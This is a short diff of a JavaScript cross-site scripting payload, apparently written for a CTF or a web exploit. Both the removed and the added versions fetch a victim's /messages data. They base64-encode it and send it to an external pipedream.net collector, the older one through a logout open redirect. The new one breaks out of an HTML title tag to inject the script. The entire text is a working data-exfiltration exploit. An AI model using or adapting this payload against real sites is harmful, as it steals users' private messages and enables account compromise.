@@ -1,10 +1,7 @@
-fetch("/messages", {
-  method: "GET",
-  credentials: "include"
-})
-  .then(r => r.text())
-  .then(txt => {
-    console.log(txt);
-    document.location = '/logout?next=https://eoeipamgnflz15n.m.pipedream.net?c=' + btoa(txt)
-  })
-  .catch(console.error);
+</title><script>
+(async()=>{
+  let r = await fetch("/messages?id=1");
+  let j = await r.json();
+  window.location = "https://eoeipamgnflz15n.m.pipedream.net?c=" + encodeURIComponent(btoa(JSON.stringify(j)));
+})()
+</script><title>
